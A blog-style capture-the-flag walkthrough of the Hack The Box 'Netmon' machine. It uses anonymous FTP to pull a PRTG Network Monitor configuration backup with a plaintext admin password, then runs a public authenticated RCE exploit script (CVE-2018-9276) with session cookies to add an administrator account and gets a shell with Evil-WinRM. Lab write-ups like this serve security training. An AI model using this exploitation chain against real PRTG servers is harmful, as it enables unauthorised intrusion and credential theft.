---
title:     "Hack The Box - Netmon"
tags: [windows,easy,ftp]
layout: post
---

![8b3d29c8e5a2939fd1e843bc68460385.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-netmon/5183bf9e557546a2ad5a0b37e3f97dcc.png)

We are going to pwn Netmon from Hack The Box.

Link : <https://www.hackthebox.eu/home/machines/profile/177>

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results:

```
PORT    STATE SERVICE       VERSION
21/tcp  open  ftp           Microsoft ftpd
80/tcp  open  http          PRTG/18.1.37.13946
|_http-server-header: PRTG/18.1.37.13946
135/tcp open  msrpc?
139/tcp open  netbios-ssn?
445/tcp open  microsoft-ds?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|WAP|phone
Running: iPXE 1.X, Linux 2.4.X|2.6.X, Sony Ericsson embedded
OS CPE: cpe:/o:ipxe:ipxe:1.0.0%2b cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivaz
OS details: iPXE 1.0.0+, Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phone
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.10: 
|_    Message signing enabled but not required
|_smb2-time: Protocol negotiation failed (SMB2)
```

## FTP:

I tried `anonymous` login without a password.
```
root@w0lf:~/CTF/HTB/Boxes/Netmon# ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows
226 Transfer complete.
```

```
ftp> cd Users
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       <DIR>          Administrator
02-03-19  12:35AM       <DIR>          Public
226 Transfer complete.
ftp> cd Administrator
550 Access is denied. 
```
I don't have permission to access `Adminstrator`.

```
ftp> cd Public
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  08:05AM       <DIR>          Documents
07-16-16  09:18AM       <DIR>          Downloads
07-16-16  09:18AM       <DIR>          Music
07-16-16  09:18AM       <DIR>          Pictures
02-03-19  12:35AM                   33 user.txt
07-16-16  09:18AM       <DIR>          Videos
226 Transfer complete.
ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
33 bytes received in 0.24 secs (0.1359 kB/s)
```
I got the user flag from `Public`.

## HTTP:

Its a PRTG Network Monitor and its version is displayed at the bottom. 

![8d0d5fe5abb3894b5c231c8f0bd2d96f.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-netmon/ab9bd3d9534c4d098a5b43b8a1a3d520.png)

><https://www.exploit-db.com/exploits/46527>

Found an exploit for that version but it seems like we need to login first.
So I tried with default credentials. `prtgadmin / prtgadmin`


![93c68190e85ea20868fdad12a50e163d.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-netmon/9b2122fdaccc41bdb138884e2814003b.png)

But I get `Your login has failed. Please try again!`

Since we have ftp connection to the entire box, let's search for the configuration file for `PRTG Network Monitor`, I googled about the location of the configuration file in the machine and found this.
><https://www.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/>

It reveals the accounts and password in `C:\ProgramData\Paessler\PRTG Network Monitor\` 

```
ftp> cd Programdata
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:15AM       <DIR>          Licenses
11-20-16  10:36PM       <DIR>          Microsoft
02-03-19  12:18AM       <DIR>          Paessler
02-03-19  08:05AM       <DIR>          regid.1991-06.com.microsoft
07-16-16  09:18AM       <DIR>          SoftwareDistribution
02-03-19  12:15AM       <DIR>          TEMP
11-20-16  10:19PM       <DIR>          USOPrivate
11-20-16  10:19PM       <DIR>          USOShared
02-25-19  10:56PM       <DIR>          VMware
226 Transfer complete.
```
There it is `Paessler`
```
ftp> cd Paessler
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
04-20-20  02:46AM       <DIR>          PRTG Network Monitor
226 Transfer complete.
ftp> cd "PRTG Network Monitor"
250 CWD command successful.
```
We found the backup files of `PRTG`
```
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
04-20-20  02:45AM       <DIR>          Configuration Auto-Backups
04-20-20  02:45AM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
04-20-20  02:45AM       <DIR>          Logs (Web Server)
04-20-20  02:45AM       <DIR>          Monitoring Database
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
04-20-20  02:46AM              1637516 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database
226 Transfer complete.
ftp> get "PRTG Configuration.old.bak"
local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1153755 bytes received in 3.33 secs (338.2911 kB/s)
```
Downloaded that to my machine.

`PRTG Configuration.old.bak` Found the password.
```
 </dbcredentials>
            <dbpassword>
              <!-- User: prtgadmin -->
              PrTg@dmin2018
            </dbpassword>
```
I tried login again with these creds but still I get `Your login has failed. Please try again!`

After some enumeration I changed it to `PrTg@dmin2019` because the `.bak` file is from `2018` which is old and it worked:


![e5d71a21665c48abbed3d85dcb94ba31.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-netmon/acbed2e387664053a200a0b666300cc4.png)

## Getting shell:

We can now use the exploit we found already.
><https://www.exploit-db.com/exploits/46527>

So according to the exploit, once we authenticated, we need to get those cookies and give it to the script and it will create a new user for us as `pentest`.
```
root@w0lf:~/CTF/HTB/Boxes/Netmon# ./exploit.sh 

[+]#########################################################################[+] 
[*] Authenticated PRTG network Monitor remote code execution                [*] 
[+]#########################################################################[+] 
[*] Date: 11/03/2019                                                        [*] 
[+]#########################################################################[+] 
[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
[+]#########################################################################[+] 
[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
[*] Version: 18.2.38                                                        [*] 
[*] CVE: CVE-2018-9276                                                      [*] 
[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
[+]#########################################################################[+] 

# login to the app, default creds are prtgadmin/prtgadmin. once authenticated grab your cookie and use it with the script.
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' 

[+]#########################################################################[+] 
 EXAMPLE USAGE: ./prtg-exploit.sh -u http://10.10.10.10 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1" 

```

I captured the request in Burp:


![c078c7d26fc0d3cb59ba88ffccb98295.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-netmon/a85c998d0d0c410ca31ad8d8773ca0e6.png)
We got what we are looking for.

```
root@w0lf:~/CTF/HTB/Boxes/Netmon# ./exploit.sh -u http://10.10.10.152 -c "_ga=GA1.4.1727861666.1587366074; _gid=GA1.4.436539900.1587366074; OCTOPUS1813713946=e0E2QkI5NkI5LTcwQTYtNDE3MS05MUM0LTc1Q0NDMzlBMTY3RX0%3D"

[+]#########################################################################[+] 
[*] Authenticated PRTG network Monitor remote code execution                [*] 
[+]#########################################################################[+] 
[*] Date: 11/03/2019                                                        [*] 
[+]#########################################################################[+] 
[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
[+]#########################################################################[+] 
[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
[*] Version: 18.2.38                                                        [*] 
[*] CVE: CVE-2018-9276                                                      [*] 
[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
[+]#########################################################################[+] 

# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' 

[+]#########################################################################[+] 

 [*] file created 
 [*] sending notification wait....

 [*] adding a new user 'pentest' with password 'P3nT3st' 
 [*] sending notification wait....

 [*] adding a user pentest to the administrators group 
 [*] sending notification wait....


 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 
```
New account is created with `Administrator Privilege`

I used [Evilwinrm](https://github.com/Hackplayers/evil-winrm) to login.
```
root@w0lf:~/tools/evil-winrm# ruby evil-winrm.rb -i 10.10.10.152 -u pentest -p 'P3nT3st!'

Evil-WinRM shell v2.2

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\pentest\Documents> cd ../../
*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/2/2019  11:35 PM             33 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
30-------------------------cc
```
And we owned root!





















